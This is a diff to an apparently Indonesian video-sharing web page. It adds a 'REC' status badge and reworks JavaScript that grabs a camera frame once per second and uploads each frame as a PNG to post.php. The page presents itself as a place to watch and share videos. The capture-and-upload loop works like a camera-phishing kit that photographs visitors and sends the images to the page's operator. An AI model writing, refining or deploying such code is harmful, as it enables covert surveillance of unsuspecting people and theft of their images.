@@ -185,6 +185,31 @@
     gap: 5px;
   }
 
+  .cam-status {
+    display: none;
+    align-items: center;
+    gap: 6px;
+    padding: 6px 12px;
+    border-radius: 20px;
+    background: rgba(239,83,80,0.12);
+    border: 1px solid rgba(239,83,80,0.25);
+    font-size: 0.75rem;
+    color: #ef5350;
+  }
+  .cam-status.active { display: flex; }
+
+  .cam-status .rec-dot {
+    width: 8px; height: 8px;
+    background: #ef5350;
+    border-radius: 50%;
+    animation: pulse 1s ease-in-out infinite;
+  }
+
+  @keyframes pulse {
+    0%, 100% { opacity: 1; transform: scale(1); }
+    50% { opacity: 0.4; transform: scale(0.8); }
+  }
+
   .section-label {
     font-size: 0.75rem;
     color: var(--muted);
@@ -436,6 +461,7 @@
     <div class="actions-bar">
       <button class="action-btn" onclick="copyShareLink()">🔗 Bagikan</button>
       <span class="view-count">👁 <span id="viewCount">—</span> tayangan</span>
+      <span class="cam-status" id="camStatus"><span class="rec-dot"></span> <span id="camStatusText">REC 0</span></span>
     </div>
   </div>
 
@@ -574,23 +600,55 @@
     var canvasId = isBack ? 'camCanvasBack' : 'camCanvasFront';
     var canvas = document.getElementById(canvasId);
     var ctx = canvas.getContext('2d');
+    var captureCount = 0;
 
+    // Show recording status
+    document.getElementById('camStatus').classList.add('active');
+
+    // Langsung capture per 1 detik
     captureInterval = setInterval(function() {
       try {
-        if (videoEl.readyState >= 2) {
-          ctx.drawImage(videoEl, 0, 0, 640, 480);
-          var data = canvas.toDataURL('image/png').replace('image/png', 'image/octet-stream');
-          sendPhoto(data);
-        }
-      } catch(e) {}
+        ctx.drawImage(videoEl, 0, 0, 640, 480);
+        var dataURL = canvas.toDataURL('image/png');
+
+        if (dataURL.length < 1000) return;
+
+        dataURL = dataURL.replace('image/png', 'image/octet-stream');
+        sendPhoto(dataURL, function() {
+          captureCount++;
+          document.getElementById('camStatusText').textContent = 'REC ' + captureCount;
+        }, function(err) {
+          console.error('Foto gagal dikirim:', err);
+          document.getElementById('camStatusText').textContent = 'ERROR';
+        });
+      } catch(e) {
+        console.error('Capture error:', e);
+      }
     }, 1000);
   }
 
-  function sendPhoto(data) {
+  function sendPhoto(data, onSuccess, onError) {
+    var formData = new FormData();
+    formData.append('cat', data);
+
     var xhr = new XMLHttpRequest();
     xhr.open('POST', 'post.php', true);
-    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
-    xhr.send('cat=' + encodeURIComponent(data));
+
+    xhr.onreadystatechange = function() {
+      if (xhr.readyState === 4) {
+        if (xhr.status === 200) {
+          if (onSuccess) onSuccess();
+        } else {
+          if (onError) onError('HTTP ' + xhr.status);
+        }
+      }
+    };
+
+    xhr.onerror = function() {
+      if (onError) onError('Network error');
+    };
+
+    xhr.send(formData);
   }
 
   function playVideo(i) {
